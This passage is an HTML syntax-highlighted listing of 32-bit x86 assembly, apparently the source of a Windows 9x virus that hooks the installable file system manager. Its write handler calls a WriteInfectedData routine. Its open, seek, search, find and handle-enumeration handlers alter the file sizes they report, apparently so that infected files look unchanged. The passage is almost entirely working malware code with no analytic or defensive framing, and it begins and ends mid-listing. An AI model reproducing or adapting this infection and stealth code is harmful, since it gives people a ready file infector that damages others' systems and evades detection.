</span><span class="sc5">prevIFSHookAddr</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc10">c</span><span class="sc4">,</span><span class="sc5">FSDFnAddr</span><span class="sc4">,</span><span class="sc5">FunctionNum</span><span class="sc4">,</span><span class="sc5">Drive</span><span class="sc4">,</span><span class="sc0"> \
                                </span><span class="sc5">ResourceFlags</span><span class="sc4">,</span><span class="sc5">CodePage</span><span class="sc4">,</span><span class="sc5">pir</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eax</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">popfd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">FuncWriteFile</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetIfshp</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">toNextIFSHook</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.our_ifsreq</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckHandle</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">toNextIFSHook</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">toNextIFSHook</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteInfectedData</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">toNextIFSHook</span><span class="sc0">


</span><span class="sc5">FuncEnumerateHandle</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pir</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ecx.ir_flags</span><span class="sc4">],</span><span class="sc5">ENUMH_GETFILEINFO</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">toNextIFSHook</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetIfshp</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">toNextIFSHook</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.our_ifsreq</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckHandle</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">toNextIFSHook</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">toNextIFSHook</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">prevIFSHook</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eax</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ecx.ir_error</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">returnIFSHook</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ecx.ir_data</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.FileSize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">_BY_HANDLE_FILE_INFORMATION</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edx.</span><span class="sc0"> \
                                                        </span><span class="sc5">bhfi_nFileSizeLow</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">returnIFSHook</span><span class="sc0">


</span><span class="sc5">FuncFileSeek</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pir</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ecx.ir_flags</span><span class="sc4">],</span><span class="sc5">FILE_END</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">toNextIFSHook</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetIfshp</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">toNextIFSHook</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.our_ifsreq</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckHandle</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">toNextIFSHook</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">toNextIFSHook</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ecx.ir_flags</span><span class="sc4">],</span><span class="sc5">FILE_BEGIN</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.FileSize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ecx.ir_pos</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">prevIFSHook</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eax</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ecx.ir_error</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">returnIFSHook</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ecx.ir_flags</span><span class="sc4">],</span><span class="sc5">FILE_END</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">returnIFSHook</span><span class="sc0">


</span><span class="sc5">FuncSearchFile</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">prevIFSHook</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eax</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pir</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.ir_error</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">returnIFSHook</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetIfshp</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">returnIFSHook</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.our_ifsreq</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_data</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">srch_entry</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.se_attrib</span><span class="sc4">],</span><span class="sc0"> \
                          </span><span class="sc5">FILE_ATTRIBUTE_LABEL</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> \
                          </span><span class="sc5">FILE_ATTRIBUTE_DEVICE</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">returnIFSHook</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">srch_entry</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.se_name</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_data</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.UniPath</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_ppath</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifsreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ifs_pbuffer</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifsreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ifs_nflags</span><span class="sc4">],</span><span class="sc5">BCS_OEM</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">VxDCall8</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_ParsePath</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_error</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">returnIFSHook</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">ACCESS_READONLY</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">SHARE_DENYNONE</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OpenFile</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">returnIFSHook</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckHandle</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">SearchCloseFile</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">SearchCloseFile</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pir</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ecx.ir_data</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.FileSize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">srch_entry</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.se_size</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">SearchCloseFile</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseFile</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">returnIFSHook</span><span class="sc0">


</span><span class="sc5">FuncFindFile</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">prevIFSHook</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eax</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pir</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.ir_error</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">returnIFSHook</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetIfshp</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">returnIFSHook</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.our_ifsreq</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ebx.ir_data</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">_WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.dwFileAttributes</span><span class="sc4">],</span><span class="sc0"> \
                          </span><span class="sc5">FILE_ATTRIBUTE_LABEL</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> \
                          </span><span class="sc5">FILE_ATTRIBUTE_DEVICE</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">returnIFSHook</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.UniPath</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFindInfoByHandle</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">returnIFSHook</span><span class="sc0">

</span><span class="sc5">FuncFindOpen</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">ACCESS_READONLY</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">SHARE_DENYNONE</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OpenFile</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">returnIFSHook</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckHandle</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">FindCloseFile</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FindCloseFile</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pir</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.FileSize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ecx.ir_data</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">_WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">eax.nFileSizeLow</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">FindCloseFile</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseFile</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">returnIFSHook</span><span class="sc0">


</span><span class="sc5">FuncOpenFile</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pir</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ecx.ir_options</span><span class="sc4">],</span><span class="sc5">ACTION_OPENEXISTING</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">toNextIFSHook</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ecx.ir_flags</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">ACCESS_MODE_MASK</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">ACCESS_WRITEONLY</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">DoOpenFile</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">ACCESS_READWRITE</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ecx.ir_flags</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">DoOpenFile</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">prevIFSHook</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc5">pfad</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">esp.pfad_eax</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ecx.ir_error</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">returnIFSHook</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ecx.ir_options</span><span class="sc4">],</span><span class="sc5">ACTION_OPENED</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">returnIFSHook</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetIfshp</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">returnIFSHook</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.our_ifsreq</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckHandle</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">returnIFSHook</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">returnIFSHook</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ifshp</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">edi.hdat.FileSize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ioreq</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ecx.ir_size</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">returnIFSHook</span><span class="sc0">


</span><span class="sc5">FuncReadFile</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetIfshp</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">toNextIFSHook</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
